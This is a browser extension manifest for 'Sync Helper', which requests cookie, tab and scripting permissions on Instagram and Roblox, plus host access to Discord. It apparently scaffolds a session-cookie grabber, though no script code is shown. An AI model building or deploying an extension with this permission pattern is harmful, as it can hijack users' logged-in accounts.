{
  "manifest_version": 3,
  "name": "Sync Helper",
  "version": "1.0",
  "description": "Session helper",
  "permissions": [
    "cookies",
    "storage",
    "tabs",
    "scripting"
  ],
  "host_permissions": [
    "https://*.instagram.com/*",
    "https://*.roblox.com/*",
    "https://discord.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": [
        "https://*.instagram.com/*",
        "https://*.roblox.com/*"
      ],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ]
}
